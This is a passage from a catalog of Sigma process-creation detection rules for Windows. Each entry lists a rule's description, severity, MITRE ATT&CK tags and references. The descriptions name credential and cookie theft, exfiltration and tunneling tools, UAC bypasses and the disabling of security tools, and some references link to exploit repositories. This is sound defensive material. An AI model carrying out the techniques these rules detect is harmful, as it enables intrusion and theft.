    Detects a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_unc2452_ps.yml
* https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware

* https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md#atomic-test-7---create-a-process-using-wmi-query-and-an-encoded-command

    
### Shell32 DLL Execution in Suspicious Directory
    
    Detects shell32.dll executing a DLL in a suspicious directory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml
* https://www.group-ib.com/resources/threat-research/red-curl-2.html

    
### Remote PowerShell Session Host Process (WinRM)
    
    Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_remote_powershell_session_process.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html

    
### HTML Help Shell Spawn
    
    Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.001
    * MITRE: attack.t1218.010
    * MITRE: attack.t1218.011
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_html_help_spawn.yml
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/

    
### Suspicious RASdial Activity
    
    Detects suspicious process related to rasdial.exe

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rasdial_activity.yml
* https://twitter.com/subTee/status/891298217907830785

    
### WMI Persistence - Script Event Consumer
    
    Detects WMI script event consumers

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmi_persistence_script_event_consumer.yml
* https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/

    
### MMC20 Lateral Movement
    
    Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of "-Embedding" as a child of svchost.exe

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mmc20_lateral_movement.yml
* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

* https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing

    
### Exfiltration and Tunneling Tools Execution
    
    Execution of well known tools for data exfiltration and tunneling

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.command_and_control
    * MITRE: attack.t1041
    * MITRE: attack.t1572
    * MITRE: attack.t1071.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exfiltration_and_tunneling_tools_execution.yml
    
### Suspicious Regsvr32 Execution With Image Extension
    
    utilizes REGSVR32.exe to execute this DLL masquerading as a Image file

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regsvr32_image.yml
* https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/

* https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html

    
### Sysmon Driver Unload
    
    Detect possible Sysmon driver unload

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    * MITRE: attack.t1562
    * MITRE: attack.t1562.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sysmon_driver_unload.yml
* https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon

    
### Atlassian Confluence CVE-2021-26084
    
    Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2021-26084

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.execution
    * MITRE: attack.t1190
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_atlassian_confluence_cve_2021_26084_exploit.yml
* https://nvd.nist.gov/vuln/detail/CVE-2021-26084

* https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html

* https://github.com/h3v0x/CVE-2021-26084_Confluence

    
### Suspicious Explorer Child Of Regsvr32
    
    Suspicious explorer.exe child of regsvr32.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regsvr32_explorer.yml
* https://redcanary.com/blog/intelligence-insights-april-2022/

* https://www.echotrail.io/insights/search/regsvr32.exe

    
### Wmiprvse Spawning Process
    
    Detects wmiprvse spawning processes

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmiprvse_spawning_process.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190810201010.html

    
### NSudo Tool Execution As System
    
    Detects the use of NSudo tool for command execution

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tool_nsudo_as_system.yml
* https://nsudo.m2team.org/en-us/

* https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/

    
### DLL Injection with Tracker.exe
    
    This rule detects DLL injection and execution via LOLBAS - Tracker.exe

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_tracker_execution.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml

    
### Ping Hex IP
    
    Detects a ping command that uses a hex encoded IP address

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ping_hex_ip.yml
* https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.can

* https://twitter.com/vysecurity/status/977198418354491392

    
### NirCmd Tool Execution
    
    Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tool_nircmd.yml
* https://www.nirsoft.net/utils/nircmd.html

* https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/

* https://www.nirsoft.net/utils/nircmd2.html#using

    
### Lazarus Session Highjacker
    
    Detects executables launched outside their default directories as used by Lazarus Group (Bluenoroff)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_lazarus_session_highjack.yml
* https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf

    
### Dropping Of Password Filter DLL
    
    Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1556.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_credential_access_via_password_filter.yml
* https://pentestlab.blog/2020/02/10/credential-access-password-filter-dll/

* https://github.com/3gstudent/PasswordFilter/tree/master/PasswordFilter

    
### SILENTTRINITY Stager Execution
    
    Detects SILENTTRINITY stager use

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_silenttrinity_stage_use.yml
* https://github.com/byt3bl33d3r/SILENTTRINITY

    
### Suspicious Load DLL via CertOC.exe
    
    Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_certoc_execution.yml
* https://twitter.com/sblmsrsn/status/1445758411803480072?s=20

    
### Possible Privilege Escalation via Weak Service Permissions
    
    Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_using_sc_to_change_sevice_image_path_by_non_admin.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://pentestlab.blog/2017/03/30/weak-service-permissions/

    
### MS Office Product Spawning Exe in User Dir
    
    Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    * MITRE: attack.g0046
    * MITRE: car.2013-05-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_office_spawn_exe_from_users_directory.yml
* sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c

* https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign

    
### Reg Disable Security Service
    
    Detects a suspicious reg.exe invocation that looks as if it would disable an important security service

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_reg_disable_sec_services.yml
* https://twitter.com/JohnLaTwC/status/1415295021041979392

* https://github.com/gordonbay/Windows-On-Reins/blob/master/wor.ps1

* https://vms.drweb.fr/virus/?i=24144899

* https://bidouillesecurity.com/disable-windows-defender-in-powershell/

    
### UAC Bypass Using Consent and Comctl32 - Process
    
    Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_consent_comctl32.yml
* https://github.com/hfiref0x/UACME

    
### WMI Spawning Windows PowerShell
    
    Detects WMI spawning PowerShell

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmi_spwns_powershell.yml
* https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml

* https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e

    
### Microsoft Office Product Spawning Windows Shell
    
    Detects a Windows command and scripting interpreter executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_office_shell.yml
* https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100

* https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html

    
### Windows Update Client LOLBIN
    
    Detects code execution via the Windows Update client (wuauclt)

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.execution
    * MITRE: attack.t1105
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wuauclt.yml
* https://dtm.uk/wuauclt/

    
### SQLite Firefox Cookie DB Access
    
    Detect use of sqlite binary to query the Firefox cookies.sqlite database and steal the cookie data contained within it

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1539
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sqlite_firefox_cookies.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.md#atomic-test-1---steal-firefox-cookies-windows

    
### Suspicious Runscripthelper.exe
    
    Detects execution of powershell scripts via Runscripthelper.exe

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_runscripthelper.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runscripthelper.yml

    
### Empire Monkey
    
    Detects EmpireMonkey APT reported Activity

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_empiremonkey.yml
* https://app.any.run/tasks/a4107649-8cb0-41af-ad75-113152d4d57b

    
### Whoami Execution Anomaly
    
    Detects the execution of whoami with suspicious parents or parameters

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    * MITRE: car.2016-03-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_whoami_anomaly.yml
* https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/

* https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/

    
### UAC Bypass Using DismHost
    
    Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_dismhost.yml
* https://github.com/hfiref0x/UACME

    
### Set Windows System File with Attrib
    
    Marks a file as a system file using the attrib.exe utility

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_attrib_system.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.001/T1564.001.md#atomic-test-3---create-windows-system-file-with-attrib

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/attrib

    
### Windows Credential Editor
    
    Detects the use of Windows Credential Editor (WCE)

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.s0005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_wce.yml
* https://www.ampliasecurity.com/research/windows-credentials-editor/

    
### Webshell Recon Detection Via CommandLine & Processes
    
    Looking for processes spawned by web server components that indicate reconnaissance by popular public domain webshells for whether perl, python or wget are installed.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_webshell_recon_detection.yml
* https://ragged-lab.blogspot.com/2020/07/webshells-automating-reconnaissance.html

    
### DNSCat2 Powershell Implementation Detection Via Process Creation
    
    The PowerShell implementation of DNSCat2 calls nslookup to craft queries. Counting nslookup processes spawned by PowerShell will show hundreds or thousands of instances if PS DNSCat2 is active locally.

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071
    * MITRE: attack.t1071.004
    * MITRE: attack.t1001.003
    * MITRE: attack.t1041
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dnscat2_powershell_implementation.yml
* https://github.com/lukebaggett/dnscat2-powershell

* https://blu3-team.blogspot.com/2019/08/powershell-dns-c2-notes.html

* https://ragged-lab.blogspot.com/2020/06/it-is-always-dns-powershell-edition.html

    
### Remote Code Execute via Winrm.vbs
    
    Detects an attempt to execute code or create service on remote host via winrm.vbs.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_winrm_execution.yml
* https://twitter.com/bohops/status/994405551751815170

* https://redcanary.com/blog/lateral-movement-winrm-wmi/

    
### Raccine Uninstall
    
    Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_disable_raccine.yml
* https://github.com/Neo23x0/Raccine

    
### Sticky Key Like Backdoor Usage
    
    Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.t1546.008
    * MITRE: car.2014-11-003
    * MITRE: car.2014-11-008
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_stickykey_like_backdoor.yml
* https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/

    
### Stop Windows Service
    
    Detects a windows service to be stopped

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1489
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_service_stop.yml
    
### DNS Tunnel Technique from MuddyWater
    
    Detecting DNS tunnel activity for Muddywater actor

    * Level: critical
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_muddywater_dnstunnel.yml
* https://www.virustotal.com/gui/file/5ad401c3a568bd87dd13f8a9ddc4e450ece61cd9ce4d1b23f68ce0b1f3c190b7/

* https://www.vmray.com/analyses/5ad401c3a568/report/overview.html

    
### Invoke-Obfuscation Via Use Clip
    
    Detects Obfuscated Powershell via use Clip.exe in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_use_clip.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Cmdl32 Execution
    
    lolbas Cmdl32 is use to download a payload to evade test

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cmdl32_lolbas.yml
* https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/

* https://twitter.com/SwiftOnSecurity/status/1455897435063074824

    
### SystemNightmare Exploitation Script Execution
    
    Detects the exploitation of PrinterNightmare to get a shell as LOCAL_SYSTEM

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_systemnightmare.yml
* https://github.com/GossiTheDog/SystemNightmare

    
### Gpscript Execution
    
    Detects the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml
* https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/

* https://lolbas-project.github.io/lolbas/Binaries/Gpscript/

    
### Suspicious 7zip Subprocess
    
    7-Zip through 21.07 on Windows allows privilege escalation (CVE-2022-29072) and command execution when a file with the .7z extension is dragged to the Help>Contents area. This is caused by misconfiguration of 7z.dll and a heap overflow. The command runs in a child process under the 7zFM.exe process.

    * Level: high
    * MITRE: cve.2022.29072
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_7zip_cve_2022_29072.yml
* https://github.com/kagancapar/CVE-2022-29072

* https://twitter.com/kagancapar/status/1515219358234161153

    
### WannaCry Ransomware
    
    Detects WannaCry ransomware activity

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1210
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1222.001
    * MITRE: attack.impact
    * MITRE: attack.t1486
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_wannacry.yml
* https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100

    
### Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION
    
    Detects Obfuscated Powershell via VAR++ LAUNCHER

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_var.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious PowerShell Mailbox Export to Share
    
    Detects a PowerShell New-MailboxExportRequest that exports a mailbox to a local share, as used in ProxyShell exploitations

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    * MITRE: attack.resource_development
    * MITRE: attack.t1584.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mailboxexport_share.yml
* https://youtu.be/5mqid-7zp8k?t=2481

* https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html

* https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1

    
### Firewall Disabled via Netsh
    
    Detects netsh commands that turns off the Windows firewall

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    * MITRE: attack.s0108
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_firewall_disable.yml
* https://www.winhelponline.com/blog/enable-and-disable-windows-firewall-quickly-using-command-line/

* https://app.any.run/tasks/210244b9-0b6b-4a2c-83a3-04bd3175d017/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-1---disable-microsoft-defender-firewall

    
### Suspicious Curl Usage on Windows
    
    Detects a suspicious curl process start on Windows and outputs the requested document to a local file

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_curl_download.yml
* https://twitter.com/reegun21/status/1222093798009790464

    
### Windows Defender Download Activity
    
    Detect the use of Windows Defender to download payloads

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_mpcmdrun_download.yml
* https://twitter.com/djmtshepana/status/1301608169496612866

* https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/

    
### Suspicious Use of Procdump
    
    Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter ' -ma ' and ' -accepteula' in a single step. This way we're also able to catch cases in which the attacker has renamed the procdump executable.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_procdump.yml
* Internal Research

    
### Disable Important Scheduled Task
    
    Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1489
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_disable.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task

    
### Interactive AT Job
    
    Detect an interactive AT job, which may be used as a form of privilege escalation.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1053.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_interactive_at.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.002/T1053.002.md

* https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html

    
### Suspicious Shells Spawn by SQL Server
    
    Detects suspicious shell spawn from MSSQL process, this might be sight of RCE or SQL Injection

    * Level: critical
    * MITRE: attack.t1505.003
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_from_mssql.yml
    
### Suspicious Msiexec Load DLL
    
    Detects MsiExec loading a DLL and calling its DllUnregisterServer function

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_msiexec_dll.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec

    
### Empire PowerShell UAC Bypass
    
    Detects some Empire PowerShell UAC bypass methods

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_empire_uac_bypass.yml
* https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64

* https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64

    
### Rundll32 Registered COM Objects
    
    load malicious registered COM objects

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.t1546.015
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rundll32_registered_com_objects.yml
* https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md

    
### Devtoolslauncher.exe Executes Specified Binary
    
    The Devtoolslauncher.exe executes other binary

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_devtoolslauncher.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml

* https://twitter.com/_felamos/status/1179811992841797632

    
### Advanced Port Scanner
    
    Detects the use of Advanced Port Scanner.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    * MITRE: attack.t1135
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_advanced_port_scanner.yml
* https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner

    
### Ps.exe Renamed SysInternals Tool
    
    Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.g0035
    * MITRE: attack.t1036.003
    * MITRE: car.2013-05-009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_ta17_293a_ps.yml
* https://www.us-cert.gov/ncas/alerts/TA17-293A

    
### Fsutil Behavior Set SymlinkEvaluation
    
    A symbolic link is a type of file that contains a reference to another file.
This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt


    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_fsutil_symlinkevaluation.yml
* https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware

* https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior

    
### LSASS Memory Dumping
    
